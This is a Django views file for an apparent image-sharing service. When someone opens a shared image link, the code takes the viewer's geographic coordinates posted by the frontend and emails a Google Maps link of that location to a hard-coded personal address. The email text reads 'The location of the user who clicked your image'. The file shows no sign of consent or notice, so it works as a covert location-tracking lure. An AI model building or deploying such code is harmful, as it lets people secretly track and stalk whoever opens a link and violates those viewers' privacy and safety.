from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.http import HttpResponse, Http404
from .models import UploadedImage
from .serializers import ImageUploadSerializer
import os
from django.conf import settings
from django.core.mail import send_mail
import json

# Dictionary to temporarily store location data for each image view
# In production, this should ideally be stored in a database or cache
location_cache = {}

# Upload image view
@api_view(['POST'])
def upload_image(request):
    serializer = ImageUploadSerializer(data=request.data)
    if serializer.is_valid():
        image = serializer.save()
        image_url = f'https://imageviewer-view.vercel.app/view/{image.id}'  # Modify this based on your frontend URL
        return Response({'imageUrl': image_url})
    return Response(serializer.errors, status=400)
# Serve image view and track location
def view_image(request, image_id):
    try:
        # Get the image from the database
        image = UploadedImage.objects.get(pk=image_id)
        image_path = os.path.join(settings.MEDIA_ROOT, str(image.image))

        if not os.path.exists(image_path):
            raise Http404("Image not found")

        # Retrieve location from the cache
        location_data = location_cache.get(str(image_id))
        print(f"Location Data for Image {image_id}: {location_data}")

        # Check if latitude and longitude exist in the location data
        if location_data and 'latitude' in location_data and 'longitude' in location_data:
            lat = location_data['latitude']
            lng = location_data['longitude']
            maps_url = f"https://www.google.com/maps?q={lat},{lng}"

            # Compose the email message if location data is valid
            subject = 'Location Tracked from Image View'
            message = f"The location of the user who clicked your image is: {maps_url}"
            recipient_list = ['guptasatyamcode@gmail.com']  # Your email

            # Send the email
            try:
                send_mail(
                    subject,
                    message,
                    settings.DEFAULT_FROM_EMAIL,  # Sender email (from settings)
                    recipient_list,
                    fail_silently=False,
                )
                print(f"Location email sent for image {image_id} to guptasatyamcode@gmail.com.")
            except Exception as email_exception:
                print(f"Error sending email: {email_exception}")
        else:
            print("Location data is not available, email will not be sent.")

        # Return the image to the viewer
        with open(image_path, 'rb') as img_file:
            return HttpResponse(img_file.read(), content_type='image/jpeg')

    except UploadedImage.DoesNotExist:
        raise Http404("Image not found")


# Track user location
@api_view(['POST'])
def track_location(request):
    image_id = request.data.get('imageId')
    location = request.data.get('location')

    if image_id and location:
        # Store location in the cache for later use when viewing the image
        location_cache[str(image_id)] = location
        print(f"Location tracked for image {image_id}: {location}")
        return Response({
            'message': 'Location tracked',
            'location': location
        }, status=200)
    else:
        return Response({'error': 'Invalid data'}, status=400)
